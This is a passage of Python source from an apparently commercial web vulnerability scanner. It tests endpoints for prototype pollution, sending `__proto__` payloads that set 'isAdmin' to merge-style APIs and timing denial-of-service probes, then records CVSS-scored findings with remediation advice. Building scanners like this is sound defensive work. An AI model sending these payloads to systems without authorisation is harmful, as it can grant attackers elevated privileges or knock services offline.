                            vuln_type=VulnType.PROTOTYPE_POLLUTION,
                            name="Prototype Pollution DoS",
                            severity=Severity.MEDIUM,
                            description=f"Denial of service possible via prototype pollution. "
                                       f"Response delayed by {elapsed:.1f}s.",
                            host=urlparse(url).netloc,
                            endpoint=url,
                            evidence=[
                                f"Payload: {json.dumps(payload)[:100]}",
                                f"Response time: {elapsed:.1f}s",
                            ],
                            cvss_score=5.3,
                            cwe_id="CWE-400",
                            confidence_score=75,
                            remediation="Implement input size limits. "
                                       "Sanitize recursive structures. "
                                       "Add request timeout limits.",
                        ).to_dict())
                        break
                        
                except asyncio.TimeoutError:
                    findings.append(Finding(
                        vuln_type=VulnType.PROTOTYPE_POLLUTION,
                        name="Prototype Pollution DoS (Timeout)",
                        severity=Severity.HIGH,
                        description="Request timeout indicates possible DoS via prototype pollution.",
                        host=urlparse(url).netloc,
                        endpoint=url,
                        evidence=["Request timed out with DoS payload"],
                        cvss_score=7.5,
                        cwe_id="CWE-400",
                        confidence_score=90,
                        remediation="Implement circuit breakers and request timeouts.",
                    ).to_dict())
                    break
                    
                except Exception as e:
                    logger.debug(f"DoS test error: {e}")
        
        return findings
    
    async def _test_api_endpoints_enterprise(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test specific API patterns for prototype pollution.
        """
        findings = []
        
        # Merge/extend endpoints
        merge_endpoints = [
            "/api/merge", "/api/extend", "/api/deepmerge",
            "/api/assign", "/api/defaults", "/api/mixin",
            "/api/clone", "/api/copy",
        ]
        
        for endpoint in merge_endpoints:
            await rate_limiter.acquire()
            
            try:
                url = urljoin(base_url, endpoint)
                
                # Test merge operation with pollution
                payload = {
                    "target": {"safe": "value"},
                    "source": {"__proto__": {"polluted": True, "isAdmin": True}},
                }
                
                response = await client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code == 200:
                    response_lower = response.text.lower()
                    
                    if "polluted" in response_lower or "isadmin" in response_lower:
                        findings.append(Finding(
                            vuln_type=VulnType.PROTOTYPE_POLLUTION,
                            name="Prototype Pollution in Merge API",
                            severity=Severity.CRITICAL,
                            description="JSON merge endpoint vulnerable to prototype pollution. "
                                       "Merge operation includes __proto__ properties.",
                            host=urlparse(url).netloc,
                            endpoint=url,
                            evidence=[
                                f"Endpoint: {endpoint}",
                                "Pollution marker in merged result",
                            ],
                            cvss_score=9.0,
                            cwe_id="CWE-1321",
                            confidence_score=95,
                            remediation="Filter __proto__, constructor, and prototype keys before merge. "
                                       "Use safe merge implementation.",
                        ).to_dict())
                        
            except Exception as e:
                logger.debug(f"Merge endpoint test error: {e}")
        
        return findings
        
        return findings
